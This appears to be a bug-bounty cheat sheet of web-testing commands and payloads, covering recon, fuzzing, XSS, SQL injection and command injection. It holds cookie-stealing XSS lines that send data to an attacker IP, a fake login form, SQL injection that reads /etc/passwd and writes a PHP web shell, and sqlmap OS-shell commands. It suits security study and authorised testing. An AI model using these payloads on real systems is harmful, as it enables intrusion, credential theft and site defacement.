# Bug Bounty

Overview
---------
1. - [Web Requests](#1---web-requests)
2. - [Web Proxies](#2---web-proxies)
3. - [Web Application Vulnerability Scanners](#3---web-application-vulnerability-scanners)
4. - [Online Resources](#4---online-resources)
5. - [Browser Plugins](#5---browser-plugins)
6. - [Web Reconnaissance](#6---web-reconnaissance)
7. - [Fuzzing](#7---fuzzing)
8. - [JavaScript Deobfuscation](#8---javascript-deobfuscation)
9. - [Cross-Site Scripting (XSS)](#9---cross-site-scripting-xss)
10. - [SQL Injection](#10---sql-injection)
11. - [Command Injection](#11---command-injection)
12. - [Sensitive Data Exposure](#12---sensitive-data-exposure)
13. - [HTML Injection](#13---html-injection)
14. - [Cross-Site Request Forgery (CSRF)](#14---cross-site-request-forgery-csrf)
15. - [Exploit Research](#15---exploit-research)

   
#1. - Web Requests
-----------------------------------------

- Curl

```
$ curl -v <URL>
$ curl -I <URL>
$ curl -i <URL>
$ curl -v -X OPTIONS <URL>
$ curl -u admin:admin <URL>
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' <URL>
$ curl <URL>/search.php?search=test
$ curl -X POST -d 'username=admin&password=admin' <URL>
$ curl -X POST -d '{"search":"test"}' -H 'Content-Type: application/json' <URL>
$ curl <URL>.php -X POST -d 'param1=key' -H 'Content-Type: application/x-www-form-urlencoded'
$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
$ curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
```

- DevTools

```
F12
```

#2. - Web Proxies
-----------------------------------------

- Burp Suite

```
Proxy -> Intercept -> Open Browser
OR
Settings -> Network Settings -> Settings -> Select Manual proxy configuration -> Enter IP address and port of our proxy -> Select Use this proxy server for all protocols 
```

- ZAP Proxy

```
Firefox Icon
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

#3. - Web Application Vulnerability Scanners
-----------------------------------------

- Nessus

```
https://www.tenable.com/products/nessus/nessus-essentials
```

- Burp Suite

```
https://portswigger.net/burp
```

- ZAP Proxy

```
https://www.zaproxy.org/
```

#4. - Online Resources
-----------------------------------------

- OWASP Web Security Testing Guide

```
https://owasp.org/www-project-web-security-testing-guide/
https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
```

- PayloadsAllTheThings

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
```

- HTML - CSS - JS Online Editor

```
https://html-css-js.com/
```

- HTML WYSIWYG Online Editor

```
https://htmlg.com/html-editor/
```

- JSFiddle Code Playground

```
https://jsfiddle.net/
```

#5. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#6. - Web Reconnaissance
-----------------------------------------

- Whois

```
$ whois <Domain Name>
https://whoisfreaks.com/
```

- DNS

```
Edit /etc/hosts OR C:\Windows\System32\drivers\etc\hosts
$ sudo sh -c 'echo "<IP address>  <Domain Name>" >> /etc/hosts'
$ dig <Domain Name>
$ dig <Domain Name> NS
$ dig <Domain Name> MS
$ dig @1.1.1.1 <Domain Name>
$ dig +trace <Domain Name>
$ dig -x <IP address>
$ dig +short <Domain Name>
$ dig <Domain Name> ANY
$ dig axfr @<Name Server> <Domain Name>
C:\> nslookup <IP address/Domain Name>
$ host <IP address/Domain Name>
$ host -t ns <Domain Name>
$ host -t mx <Domain Name>
$ host -t txt <Domain Name>
$ host -l <Domain Name> <DNS server name/IP address>
$ dnsenum <Domain Name>
$ dnsenum --enum <Domain Name> -f <wordlist> -r
$ dnsrecon -d <Domain Name> -t axfr
$ fierce --domain <Domain Name> --subdomains accounts admin ads
$ theHarvester -d <Domain Name> -b google > google.txt
$ amass enum -d <Domain Name>
$ assetfinder <Domain Name>
$ puredns bruteforce <wordlist> <Domain Name>
$ gobuster vhost -u http://<IP address> -w <wordlist> --append-domain
$ feroxbuster -w <wordlist> -u <URL>
$ ffuf -w <wordlist> -u http://<IP address> -H "HOST: FUZZ.<Domain Name>"
https://crt.sh/
$ curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
https://search.censys.io/
```

- Fingerprinting

```
$ curl -I <URL/Domain Name>
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
https://builtwith.com/
$ whatweb <Domain Name>
$ nmap -O -sC <IP address>
https://searchdns.netcraft.com/
$ wafw00f <Domain Name>
$ nikto -h <Domain Name> -Tuning b
```

- Robots.txt

```
http://<Domain Name>/robots.txt
```

- Well-Known URLs

```
https://<Domain Name>/.well-known/security.txt
https://<Domain Name>/.well-known/change-password
https://<Domain Name>/.well-known/openid-configuration
https://<Domain Name>/.well-known/assetlinks.json
https://<Domain Name>/.well-known/mta-sts.txt
```

- Web Crawlers

```
Burp Suite Spider
OWASP ZAP
Scrapy
Apache Nutch
$ python3 ReconSpider.py <URL>
```

- Scrapy Web Crawler

```
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)

$ jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

- Search Engines

```
https://www.exploit-db.com/google-hacking-database
site:example.com
inurl:login
filetype:pdf
intitle:"confidential report"
intext:"password reset"
cache:example.com
link:example.com
related:example.com
info:example.com
define:phishing
site:example.com numrange:1000-2000
allintext:admin password reset
allinurl:admin panel
allintitle:confidential report 2023
site:example.com AND (inurl:admin OR inurl:login)
"linux" OR "ubuntu" OR "debian"
site:bank.com NOT inurl:login
site:socialnetwork.com filetype:pdf user* manual
site:ecommerce.com "price" 100..500
"information security policy"
site:news.com -inurl:sports
```

- Web Archives

```
https://web.archive.org/
```

- Automated Recon

```
$ python finalrecon.py --headers --whois --url <URL>
$ python finalrecon.py --full --url <URL>
Recon-ng
theHarvester
SpiderFoot
OSINT Framework
```

#7. - Fuzzing
-----------------------------------------

- Directory Fuzzing

```
$ ffuf -w <wordlist>:FUZZ        # assign wordlist to a keyword
$ ffuf -w <wordlist> -u http://<Domain Name>/FUZZ
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ
```

- Extension Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/indexFUZZ
```

- Page Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/blog/FUZZ.php
```

- Recursive Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/FUZZ -recursion -recursion-depth 1 -e .php -v
```

- Sub-Domain Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u https://FUZZ.<Domain Name>
```

- VHOST Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>'
```

- Filter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/ -H 'Host: FUZZ.<Domain Name>' -fs 900
```

- GET Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php?FUZZ=key -fs 900
```

- POST Request Parameter Fuzzing

```
$ ffuf -w <wordlist>:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

- Parameter Value Fuzzing

```
$ for i in $(seq 1 1000); do echo $i >> ids.txt; done        # create text file with numbers 1-1000
$ ffuf -w ids.txt:FUZZ -u http://<Domain Name>/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 900
```

#8 - JavaScript Deobfuscation
-----------------------------------------

- JavaScript Obfuscator

```
https://beautifytools.com/javascript-obfuscator.php
https://obfuscator.io/
https://jsfuck.com/
https://utf-8.jp/public/jjencode.html
https://utf-8.jp/public/aaencode.html
```

- JavaScript Beautifier

```
https://beautifytools.com/javascript-beautifier.php
Browser Dev Tools -> Pretty Print
https://prettier.io/playground/
https://beautifier.io/
```

- JavaScript Deobfuscator

```
https://matthewfl.com/unPacker.html
http://www.jsnice.org/
```

- JavaScript Console Debugger

```
https://jsconsole.com/
```

- JavaScript Minifier

```
https://www.toptal.com/developers/javascript-minifier
```

- Base64 Encode/Decode

```
$ echo <string> | base64
$ echo <base64 string> | base64 -d
```

- Hex Encode/Decode

```
$ echo <string> | xxd -p
$ echo <hex string> | xxd -p -r
```

- ROT13 Encode/Decode

```
$ echo <string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
$ echo <ROT13 string> | tr 'A-Za-z' 'N-ZA-Mn-za-m'
https://rot13.com/
```

- Cipher Identifier & Analyzer

```
https://www.boxentriq.com/code-breaking/cipher-identifier
```

#9. - Cross-Site Scripting (XSS)
-----------------------------------------

- *Reflected XSS (non-persistent - processed on the back-end server)*
   - *Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).*
- *Stored XSS (persistent)*
   - *Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).*
- *DOM XSS (non-persistent - processed on the client-side)*
   - *Occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server and is written to an HTML DOM object (e.g., through client-side HTTP parameters or anchor tags - vulnerable username or page title).*

- Basic XSS Payloads

```
<script>alert("XSS")</script>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<plaintext>
<script>print()</script> 
```

- HTML XSS Payloads

```
<img src="" onerror=alert(window.origin)>	
```

- Deface XSS Payloads

```
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Old Milks</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="Fattest Milks"> </p></center>'</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
<script>document.getElementById('urlform').remove();</script>
<script>document.write('<h3>Please login to continue</h3><form action=http://<IP address>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

- Remote Script XSS Payloads

```
<script src="http://<IP address>/script.js"></script>	
```

- Cookie XSS Payloads

```
<script>document.location='http://<IP address>/index.php?c='+document.cookie;</script>
<script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
```

- DOM XSS Payloads

```
#"><img src=/ onerror=alert(document.cookie)>
<img src="" onerror=alert(window.origin)>
```

- Bulk XSS Payloads

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list
```

- Automated XSS

```
$ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"
https://github.com/rajeshmajumdar/BruteXSS
https://github.com/epsylon/xsser
```

#10. - SQL Injection
-----------------------------------------

- *In-band SQL Injection*
   - *Union Based*
      - *Specify the exact location e.g. column which we can read - output printed to front-end.*
   - *Error Based*
      - *Intentionally cause an error - output printed to front-end.* 
- *Blind SQL Injection*
   - *Boolean Based*
      - *Use conditional statements to control whether the page returns any output at all.* 
   - *Time Based*
      - *Use conditional statements that delay the page response e.g. using Sleep().* 
- *Out-of-band SQL Injection*
   - *Direct output to remote location e.g. DNS record.*

- SQL Login

```
$ mysql -u <username> -h <hostname> -P 3306 -p
```

- SQL General Commands

```
SHOW DATABASES;
USE users;
SHOW TABLES;
SELECT * FROM table_name;
```

- SQL Table Commands

```
CREATE TABLE logins (id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME);
CREATE TABLE logins (id INT NOT NULL AUTO_INCREMENT, username VARCHAR(100) UNIQUE NOT NULL, password VARCHAR(100) NOT NULL, date_of_joining DATETIME DEFAULT NOW(), PRIMARY KEY (id));
DESCRIBE logins;
DROP TABLE logins;
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value);
INSERT INTO table_name(column2, column3) VALUES (column2_value, column3_value);
INSERT INTO table_name(column2, column3) VALUES (column2_value, column3_value), (column2_value, column3_value);
```

- SQL Column Commands

```
SELECT column1, column2 FROM table_name;
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
ALTER TABLE logins DROP oldColumn;
UPDATE table_name SET column1=newvalue1, column2=newvalue2 WHERE <condition>;
```

- SQL Output Commands

```
SELECT * FROM logins ORDER BY column_1;
SELECT * FROM logins ORDER BY column_1 DESC;
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;
SELECT * FROM table_name WHERE <condition>;
SELECT * FROM logins WHERE username LIKE 'admin%';
SELECT * FROM logins WHERE username like '___';
SELECT * FROM logins WHERE username != 'john';
SELECT * FROM logins WHERE username != 'john' AND id > 1;
SELECT * FROM logins WHERE username != 'john' OR id > 1;
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

- SQL Discovery Checkers

```
'
"
#
;
)
%27
%22
%23
%3B
%29
```

- SQL Auth Bypass

```
admin' or '1'='1
admin')-- -
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
```

- SQL Union Injection (comments -- need a space after them to work, the hyphen is there for readability)

```
' order by 1-- -
cn' UNION select 1,2,3-- -
cn' UNION select 1,@@version,3,4-- -
UNION select username, 2, 3, 4 from passwords-- -
```

- SQL DB Enumeration

```
SELECT @@version
SELECT POW(1,1)
SELECT SLEEP(5)
SELECT * FROM my_database.users;
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),3,4-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

- SQL Privilege Checks

```
SHOW GRANTS;
SELECT USER()
cn' UNION SELECT 1, user(), 3, 4-- -
SELECT CURRENT_USER()
SELECT user from mysql.user
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
cn' UNION SELECT 1, user(), 3, 4-- -
SELECT super_priv FROM mysql.user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
SHOW VARIABLES LIKE 'secure_file_priv';
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

- SQL File Injection

```
SELECT LOAD_FILE('/etc/passwd');
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
SELECT * from users INTO OUTFILE '/tmp/credentials';
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

- SQLMap

```
$ sqlmap -u <URL> --batch --dump
$ sqlmap <URL> --data 'uid=1&name=test'
$ sqlmap <URL> --data 'uid=1*&name=test'        # use * to specify the parameter to inject e.g. to test HTTP headers like cookie header 
$ sqlmap <URL> --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
$ sqlmap -u <URL> --data='id=1' --method PUT
$ sqlmap -u <URL> --batch -t /tmp/traffic.txt
$ sqlmap -u <URL> --parse-errors
$ sqlmap -u <URL> -v 6 --batch
$ sqlmap -u <URL> --proxy=http://127.0.0.1:8080
$ sqlmap -u <URL> --prefix="%'))" --suffix="-- -"
$ sqlmap -u <URL> -v 3 --level=5
$ sqlmap -u <URL> --level=5 --risk=3
$ sqlmap -u <URL> --banner --current-user --current-db --is-dba
$ sqlmap -u <URL> --tables -D testdb
$ sqlmap -u <URL> --dump-all
$ sqlmap -u <URL> --dump-all --exclude-sysdbs
$ sqlmap -u <URL> --dump -D testdb
$ sqlmap -u <URL> --dump -T users -D testdb
$ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
$ sqlmap -u <URL> --dump -T users -D testdb --start=2 --stop=3
$ sqlmap -u <URL> --dump -T users -D testdb --where="name LIKE 'f%'"
$ sqlmap -u <URL> --schema
$ sqlmap -u <URL>--search -T user
$ sqlmap -u <URL> --passwords --batch
$ sqlmap -u <URL> --passwords --batch --all
$ sqlmap -u <URL> --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="<CSRF token parameter>"
$ sqlmap -u <URL> --randomize=rp --batch -v 5 | grep URI
$ sqlmap <URL> --random-agent
$ sqlmap -u <URL> --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
$ sqlmap --list-tampers
$ sqlmap -u <URL> --tamper=between
$ sqlmap -u <URL> --is-dba
$ sqlmap -u <URL> --file-read "/etc/passwd"
$ sqlmap -u <URL> --file-write "shell.php" --file-dest "/var/www/html/shell.php"
$ sqlmap -u <URL> --os-shell
```

- SQLMAP .req file

```
Copy the entire request from Burp
$ vi login.req
Paste the entire request from Burp
$ sqlmap -r login.req
```

#11. - Command Injection
-----------------------------------------

- Command Injection Operators

```
;
\n
&
|
&&
||
`` (Linux only - wrap command in backticks)
$() (Linux only - wrap command in parentheses)
```

- Linux Filtered Character Bypass

```
printenv
%09
${IFS}
{ls,-la}
${PATH:0:1}
${LS_COLORS:10:1}
$(tr '!-}' '"-~'<<<[)
```

#12. - Sensitive Data Exposure
-----------------------------------------

- Source Code

```
Right-click -> View page source
OR
CTRL + U
```

#13. - HTML Injection
-----------------------------------------

- Hyperlink

```
<a href="http://www.google.com">Click Me</a>
```


#14. - Cross-Site Request Forgery (CSRF)
-----------------------------------------

- Password Change

```
"><script src=//www.example.com/exploit.js></script>
```

#15. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```
